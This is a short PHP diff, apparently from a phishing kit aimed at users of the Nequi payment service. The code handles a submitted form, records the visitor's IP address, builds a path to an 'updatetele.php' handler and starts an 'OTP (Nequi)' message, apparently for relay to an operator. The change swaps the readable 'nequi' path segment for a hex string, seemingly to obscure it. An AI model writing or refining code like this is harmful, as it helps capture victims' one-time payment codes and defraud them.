@@ -37,9 +37,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $ip_cliente = $_SERVER['REMOTE_ADDR'];
         $nequiBaseUrl = $baseUrl;
         if (strpos($baseUrl, 'updatetele.php') !== false) {
-            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
+            $nequiBaseUrl = str_replace('updatetele.php', 'pago/c3a7f91e/process/updatetele.php', $baseUrl);
         } else {
-            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
+            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/c3a7f91e/process/updatetele.php';
         }
 
         $message = "🔄 <b>OTP (Nequi)</b>\n\n"
